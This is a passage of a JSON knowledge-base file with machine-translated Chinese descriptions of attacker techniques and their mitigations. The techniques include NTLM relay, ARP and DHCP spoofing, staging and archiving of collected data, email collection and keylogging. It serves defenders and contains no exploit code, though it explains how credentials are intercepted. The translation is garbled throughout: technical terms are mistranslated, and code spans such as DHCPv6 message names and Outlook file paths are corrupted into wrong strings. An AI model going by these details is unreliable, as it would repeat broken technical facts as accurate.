          "content": "在某些情况下，对手可以访问系统身份验证路径中的系统或使用凭据扫描使用凭据尝试对对手控制的系统进行身份验证的自动扫描时，NTLMV1/V2哈希可以截获并传递以访问和执行代码针对目标系统。继电器步骤可以与中毒结合发生，但也可能与之无关。此外，对手可以将NTLMV1/V2哈希封装到各种协议中，例如LDAP，SMB，MSSQL和HTTP，以扩展和使用有效的NTLM响应的多个服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用几种工具来毒化本地网络中的名称服务，例如NBNSPOOF，METASPLOIT和RESSONDER。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在本地计算机安全设置或组策略中禁用LLMNR和NETBIO，如果它们在环境中不需要。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "使用基于主机的安全软件阻止LLMNR/NetBios流量。启用SMB签名可以阻止NTLMV2继电器攻击。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "网络细分可用于隔离不需要广泛网络访问的基础架构组件。这可能减轻或至少减轻AITM活动的范围。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557.002",
    "name": "ARP Cache Poisoning",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会毒化解决分辨率协议（ARP）缓存，以将自己定位在两个或多个网络设备的通信之间。该活动可用于实现跟进行为，例如网络嗅探或传输数据操纵。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ARP协议用于解析IPv4地址来链接层地址，例如媒体访问控制（MAC）地址。本地网络段中的设备通过使用链路层地址相互通信。如果网络设备没有特定网络设备的链接层地址，则可以将广播ARP请求发送到本地网络，以将IP地址转换为MAC地址。具有关联的IP地址的设备直接与其MAC地址回复。然后，提出ARP请求的网络设备将使用以及将这些信息存储在其ARP缓存中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会被动地等待ARP请求毒害请求设备的ARP缓存。对手可以用他们的MAC地址答复，从而欺骗受害者，使他们相信他们正在与预期的网络设备进行交流。为了使对手毒害ARP缓存，他们的答复必须比合法的IP地址所有者的答复更快。对手也可能会发送免费的ARP答复，该答复恶意地宣布了对本地网络细分市场中所有设备的特定IP地址的所有权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ARP协议是无状态的，不需要身份验证。因此，设备可能错误地添加或更新其ARP缓存中IP地址的MAC地址。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用ARP缓存中毒作为拦截网络流量的手段。该活动可用于收集和/或继电器数据，例如凭据，尤其是根据不安全的未加密协议发送的数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用在无用的ARP答复中更新ARP缓存。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "确保适当地加密所有有线和/或无线流量。使用最佳实践来进行身份验证协议，例如Kerberos，并确保可能包含凭据的网络流量受SSL/TLS的保护。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在开关上启用DHCP侦听和动态ARP检查，以在通过DHCP和ARP表请求的IP地址之间创建映射，并将值将值绑定到可能阻止虚假流量的交换机上的端口。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "为网络设备创建静态ARP条目。对于大型网络，实施静态ARP条目可能是不可行的。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "培训用户对证书错误感到怀疑。对手可以使用自己的证书来拦截HTTPS流量。当应用程序的证书与主机预期的证书不匹配时，证书错误可能会出现。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557.003",
    "name": "DHCP Spoofing",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过欺骗动态主机配置协议（DHCP）流量并充当受害者网络上的恶意DHCP服务器，将网络流量重定向到对手拥有的系统。通过达到中间人（AITM）的位置，对手可以收集网络通信，包括传递的凭据，尤其是那些通过不安全的，未加密的协议发送的凭据。这也可以实现跟进行为，例如网络嗅探或传输数据操纵。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DHCP基于客户端服务器模型，并具有两个功能：一种用于从DHCP服务器提供网络配置设置为客户端的协议，以及将网络地址分配给客户端的机制。典型的服务器客户交互如下："
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在受害者网络上欺骗一个流氓DHCP服务器，合法主机可能会从中获得恶意网络配置。例如，恶意软件可以充当DHCP服务器，并为受害的计算机提供对手拥有的DNS服务器。通过恶意网络配置，对手可以实现AITM位置，通过对手控制的系统路由客户端流量，并从客户端网络收集信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DHCPV6客户端可以通过向"
        },
        {
          "type": "code",
          "content": " inovery-request（代码11）"
        },
        {
          "type": "text",
          "content": "消息发送到"
        },
        {
          "type": "code",
          "content": " all_dhcp_relay_agents_and_and_servers "
        },
        {
          "type": "text",
          "content": " multiCast地址，而无需分配IP地址即可接收网络配置信息。对手可以使用其Rogue DHCP服务器以恶意网络配置来响应此请求消息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会通过生成许多广播发现的消息来耗尽网络的DHCP分配池，而不是建立AITM位置，而是可能滥用DHCP DHCP欺骗来进行DHCP耗竭攻击（即服务耗尽洪水）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑过滤端口67和68上的DHCP流量，从未知或未经信任的DHCP服务器中进行过滤。此外，在图层交换机上也可以启用端口安全性。此外，考虑在第2层开关上启用DHCP侦探，因为它将防止DHCP欺骗攻击和饥饿攻击。考虑通过脚本或工具跟踪可用的IP地址。"
            }
          ],
          [
            {
              "type": "text",
              "content": "此外，阻止DHCPV6流量和传入的路由器广告，尤其是在网络中常用IPv6时。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1560.001",
    "name": "Archive via Utility",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Archive Collected Data",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在脱落之前使用实用程序来压缩和/或加密所收集的数据。许多公用事业都包括压缩，加密或以其他方式将数据打包成更容易/更安全运输的格式的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用各种公用事业在渗透之前压缩或加密数据。可以预装一些第三方实用程序，例如Linux和MacOS上的"
        },
        {
          "type": "code",
          "content": " tar "
        },
        {
          "type": "text",
          "content": "，或Windows Systems上的"
        },
        {
          "type": "code",
          "content": " ZIP "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Windows上，"
        },
        {
          "type": "code",
          "content": " diantz "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " makecab "
        },
        {
          "type": "text",
          "content": "可用于将收集的文件包装到机柜（.cab）文件中。"
        },
        {
          "type": "code",
          "content": " diantz "
        },
        {
          "type": "text",
          "content": "也可用于从远程位置下载和压缩文件（即远程数据登台）。"
        },
        {
          "type": "code",
          "content": " Xcopy "
        },
        {
          "type": "text",
          "content": " Windows上可以使用各种选项复制文件和目录。此外，对手可能会在脱落之前对基本64进行certutiTil编码所收集的数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用第三方公用事业，例如7-zip，winrar和winzip进行类似的活动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "可以执行系统扫描以识别未经授权的档案公用事业。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1560.002",
    "name": "Archive via Library",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Archive Collected Data",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用第三方库在拆卸之前收集的对手或加密数据。存在许多可以存档数据的库，包括Python Rarfile，Libzip和Zlib。大多数库都包含加密和/或压缩数据的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一些档案库已预装在系统上，例如MacOS和Linux上的BZIP2，以及Windows上的ZIP。请注意，库与实用程序不同。在编译时可以将库链接到链接，而公用事业则需要产卵子壳或类似的执行机制。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1560.003",
    "name": "Archive via Custom Method",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Archive Collected Data",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用自定义方法在去滤觉之前收集的数据或加密数据。对手可以选择使用自定义的档案方法，例如使用没有外部库或实用程序参考的XOR加密或流量密码。还使用了众所周知的压缩算法的自定义实现。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1602.001",
    "name": "SNMP (MIB Dump)",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data from Configuration Repository",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以针对管理信息基地（MIB），以在使用简单网络管理协议（SNMP）管理的网络中收集和/或地雷有价值的信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MIB是一个配置存储库，可在对象标识符（OID）的形式中存储可通过SNMP访问的可变信息。每个OID都会标识一个可以读取或设置的变量，并允许通过远程修改这些变量进行主动管理任务，例如配置更改。SNMP可以为管理员提供对其系统的良好见解，例如系统信息，硬件，物理位置和软件包的描述。MIB还可能包含设备操作信息，包括运行配置，路由表和接口详细信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用SNMP查询直接从SNMP管理的设备收集MIB内容，以收集允许对手构建网络图并促进未来目标利用的网络信息。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "配置SNMPV3以使用可用的最高安全性（AUTHPRIV）。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "应用扩展的ACL以阻止受信任网络之外未经授权的协议。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "配置入侵预防设备，以检测未经授权来源的SNMP查询和命令。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "在单独的管理网络上隔离SNMP流量。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "允许列表MIB对象并实现SNMP视图。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "将系统图像和软件更新，然后迁移到SNMPV3。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1602.002",
    "name": "Network Device Configuration Dump",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data from Configuration Repository",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以访问网络配置文件，以收集有关设备和网络的敏感数据。网络配置是一个包含确定设备操作的参数的文件。该设备通常在操作时存储配置的内存副本，并在设备重置后加载非挥发性存储上的单独配置。对手可以检查配置文件，以揭示有关目标网络及其布局，网络设备及其软件的信息，或确定合法帐户和凭据以供以后使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用常见的管理工具和协议，例如简单网络管理协议（SNMP）和SMART Install（SMI）来访问网络配置文件。这些工具可用于查询配置存储库的特定数据，或配置设备以导出配置以进行以后分析。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "配置SNMPV3以使用可用的最高安全性（AUTHPRIV）。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "应用扩展的ACL以阻止受信任网络之外未经授权的协议。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "配置入侵预防设备，以检测未经授权来源的SNMP查询和命令。创建签名以检测来自可信赖主管以外的来源的智能安装（SMI）用法。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "在单独的管理网络上隔离SNMP流量。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "允许列表MIB对象并实现SNMP视图。如果不使用，请禁用智能安装（SMI）。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "将系统图像和软件更新，然后迁移到SNMPV3。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1213.001",
    "name": "Confluence",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data from Information Repositories",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用汇合存储库来开采宝贵的信息。通常在开发环境中与Atlassian Jira一起发现，Confluence通常用于存储与开发相关的文档，但是，通常，通常包含更多种有用的信息，例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "政策，程序和标准"
        },
        {
          "type": "list",
          "content": "物理 /逻辑网络图"
        },
        {
          "type": "list",
          "content": "系统体系结构图"
        },
        {
          "type": "list",
          "content": "技术系统文档"
        },
        {
          "type": "list",
          "content": "测试 /开发证书"
        },
        {
          "type": "list",
          "content": "工作 /项目时间表"
        },
        {
          "type": "list",
          "content": "源代码段"
        },
        {
          "type": "list",
          "content": "链接到网络共享和其他内部资源"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑对关键和敏感汇合存储库的帐户和特权进行定期审查。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "执行至少特权的原则。考虑实施包括身份验证和授权在内的访问控制机制。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "制定和发布策略，这些策略定义可接受的信息要存储在Confluence存储库中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1213.002",
    "name": "Sharepoint",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data from Information Repositories",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用SharePoint存储库作为挖掘有价值信息的来源。SharePoint通常将包含有用的信息，以了解对手，以了解内部网络和系统的结构和功能。例如，以下是示例信息的列表，这些信息可能具有对对手的潜在价值，也可以在SharePoint上找到："
        }
      ],
      [
        {
          "type": "list",
          "content": "政策，程序和标准"
        },
        {
          "type": "list",
          "content": "物理 /逻辑网络图"
        },
        {
          "type": "list",
          "content": "系统体系结构图"
        },
        {
          "type": "list",
          "content": "技术系统文档"
        },
        {
          "type": "list",
          "content": "测试 /开发证书"
        },
        {
          "type": "list",
          "content": "工作 /项目时间表"
        },
        {
          "type": "list",
          "content": "源代码段"
        },
        {
          "type": "list",
          "content": "链接到网络共享和其他内部资源"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑对关键和敏感的SharePoint存储库的帐户和特权进行定期审查。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "执行至少特权的原则。考虑实施包括身份验证和授权在内的访问控制机制。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "制定和发布策略，这些策略定义可接受的信息要存储在SharePoint存储库中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1213.003",
    "name": "Code Repositories",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data from Information Repositories",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用代码存储库来收集有价值的信息。代码存储库是存储源代码和自动化软件构建的工具/服务。它们可以内部或私人托管在Github，Gitlab，SourceForge和Bitbucket等第三方网站上。用户通常通过Web应用程序或命令行实用程序（例如GIT）与代码存储库进行交互。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦对手可以访问受害者网络或私人代码存储库，他们可能会收集敏感信息，例如软件源代码中包含的专有源代码或凭据。访问软件的源代码可能会使对手可以开发利用利用，而凭据可以使用有效的帐户访问其他资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：这与代码存储库不同，该代码存储库的重点是通过公共代码存储库进行侦察。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑对关键和敏感代码存储库的帐户和特权进行定期审查。扫描代码存储库获取暴露的凭据或其他敏感信息。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "使用登录的多因素身份验证来代码存储库。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "执行至少特权的原则。考虑实施访问控制机制，包括代码存储库的身份验证和授权。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "制定和发布策略，这些策略定义可接受的信息要存储在代码存储库中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1074.001",
    "name": "Local Data Staging",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data Staged",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在去渗透之前在本地系统的中心位置或目录中分期收集数据。数据可以保存在单独的文件中，也可以通过诸如收集的档案数据等技术合并到一个文件中。可以使用交互式命令壳，并且CMD中的共同功能可用于将数据复制到分期位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以以系统的各种可用格式/位置（包括本地存储数据库/存储库或Windows注册表）进行分阶段收集的数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1074.002",
    "name": "Remote Data Staging",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Data Staged",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在渗透之前从中央位置的多个系统或目录中的多个系统收集的阶段数据。数据可以保存在单独的文件中，也可以通过诸如收集的档案数据等技术合并到一个文件中。可以使用交互式命令壳，并且CMD中的共同功能可用于将数据复制到分期位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在云环境中，对手可能会在脱落之前在特定实例或虚拟机中阶段数据。对手可以在该实例中创建云实例和阶段数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过在去渗透之前对一个系统进行分配，对手可以最大程度地减少与C2服务器的连接数量，并更好地逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1114.001",
    "name": "Local Email Collection",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Email Collection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以针对本地系统上的用户电子邮件来收集敏感信息。可以从用户的本地系统（例如Outlook存储或缓存文件）中获取包含电子邮件数据的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Outlook将数据存储在离线数据文件中，其扩展为.ost。Outlook 2010和后来支持的.ost文件大小高达50GB，而较早版本的Outlook支持最高为20GB。IMAP帐户在Outlook 2013（及更早）和POP帐户中使用Outlook Data Files（.pst）而不是.ost，而Outlook 2016（及以后）的IMAP帐户使用.ost文件。两种类型的Outlook数据文件通常都存储在"
        },
        {
          "type": "code",
          "content": " c：\\ users \\ <username> \\ documents> \\ documents \\ outlook Files "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " c：\\ users \\ users \\ username> \\ appdata \\ appdata \\ local \\ local \\ Microsoft \\ Microsoft \\ Outlook中"
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "加密的使用为通过电子邮件发送的敏感信息提供了额外的安全层。使用公共密钥密码学的加密要求对手获得专用证书以及解密消息的加密密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1114.002",
    "name": "Remote Email Collection",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Email Collection",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以针对Exchange Server，Office 365或Google Workspace收集敏感信息。对手可以利用用户的凭据并直接与Exchange Server进行交互以从网络内获取信息。对手也可以访问外部面对的交换服务，Office 365或Google Workspace，以使用凭据或访问令牌访问电子邮件。诸如Mailsniper之类的工具可用于自动搜索特定关键字。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "加密的使用为通过电子邮件发送的敏感信息提供了额外的安全层。使用公共密钥密码学的加密要求对手获得专用证书以及解密消息的加密密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证用于面向公共的网络邮件服务器是推荐的最佳实践，以最大程度地减少用户名和密码对对手的有用性。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1114.003",
    "name": "Email Forwarding Rule",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Email Collection",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以设置电子邮件转发规则以收集敏感信息。对手可能会滥用电子邮件转发规则，以监视受害者的活动，窃取信息，并进一步获得受害者或受害者组织的情报，以作为进一步利用或操作的一部分。此外，即使在管理员重置受损的证书后，电子邮件转发规则也可以使对手能够保持对受害者电子邮件的持续访问。大多数电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括转发给其他收件人。这些规则可以通过本地电子邮件应用程序，Web接口或命令行接口创建。消息可以转发给内部或外部接收者，并且没有限制该规则的范围。管理员还可以为用户帐户创建具有相同注意事项和结果的转发规则。"
        }
      ],
      [
        {
          "type": "text",
          "content": "组织中的任何用户或管理员（或具有有效凭据的对手）都可以创建规则，以自动将所有收到的消息转发给另一个收件人，将电子邮件转发到基于发件人的不同位置，等等。对手也可以通过使用Microsoft Messaging API（MAPI）来修改规则属性，从而使其隐藏起来，并且从Outlook，OWA或大多数交换管理工具中看不见。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些环境中，管理员可能能够启用在整个组织中而不是在单个收件箱上运行的电子邮件转发规则。例如，Microsoft Exchange支持运输规则，该规则评估了组织在用户指定条件下收到的所有邮件，然后在邮件上执行遵守这些条件的用户指定操作。滥用此类功能的对手可能能够在组织收到的全部或特定邮件上转发。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "企业电子邮件解决方案具有监视机制，其中可能包括定期审核自动转向规则的能力。"
            }
          ],
          [
            {
              "type": "text",
              "content": "在交换环境中，管理员可以使用"
            },
            {
              "type": "code",
              "content": " Get-inboxRule "
            },
            {
              "type": "text",
              "content": "/"
            },
            {
              "type": "code",
              "content": " remove-inboxRule "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " get-transportrule "
            },
            {
              "type": "text",
              "content": "/"
            },
            {
              "type": "code",
              "content": " remove-transportrule "
            },
            {
              "type": "text",
              "content": "发现并删除潜在的恶意自动范围和运输规则。除此之外，还可以利用MAPI编辑器来检查基础数据库结构，并发现对自动转向规则的属性的任何修改/篡改。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用外部电子邮件转发。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "加密的使用为通过电子邮件发送的敏感信息提供了额外的安全层。使用公共密钥密码学的加密要求对手获得专用证书以及解密消息的加密密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.001",
    "name": "Keylogging",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在用户键入时记录用户击键以拦截凭据。当OS凭据倾销工作无效时，KeyLogging可能会用于获得新的访问机会的证书，并且可能需要对手在很长一段时间内拦截在系统上的击键，然后才能成功捕获凭证。为了增加快速捕获证书的可能性，对手也可以执行诸如清除浏览器cookie以迫使用户重新验证系统的操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "钥匙扣是最普遍的输入捕获类型，具有许多不同的拦截击键的方式。一些方法包括："
        }
      ],
      [
        {
          "type": "list",
          "content": "挂钩API回调用于处理击键。与凭证挂钩不同，这仅着重于用于处理击键数据的API函数。"
        },
        {
          "type": "list",
          "content": "从硬件缓冲区读取原始击键数据。"
        },
        {
          "type": "list",
          "content": "Windows注册表修改。"
        },
        {
          "type": "list",
          "content": "自定义驱动程序。"
        },
        {
          "type": "list",
          "content": "修改系统图像可能会为对手提供钩子进入网络设备的操作系统，以读取用于登录会话的原始击键。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1056.002",
    "name": "GUI Input Capture",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会模仿通用操作系统GUI组件，以提示用户以看似合理的提示来获取凭据。当执行需要额外特权的程序比当前用户上下文中存在的其他特权时，操作系统通常提示用户适当的凭据授权任务的高架特权（例如：旁路用户帐户控制）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会模仿此功能，以提示用户获得凭据合法提示的凭据，原因是许多原因模仿了正常使用情况，例如需要额外访问或假装恶意软件删除套件的伪造安装程序。这种类型的提示可用于通过各种语言（例如AppleScript和PowerShell）收集凭据。在Linux系统上，对手可以启动对话框，以提示用户获得恶意壳脚本或命令行（即Unix Shell）的凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "使用用户培训来引起人们的意识并引起对潜在的恶意事件和对话框的怀疑（例如：办公文件，提示凭证）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.003",
    "name": "Web Portal Capture",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在外部面向门户（例如VPN登录页面）上安装代码，以捕获和传输试图登录服务的用户的凭据。例如，在将用户登录到服务之前，可能会记录提供的用户凭据。"
        }
      ],
      [
        {
          "type": "text",
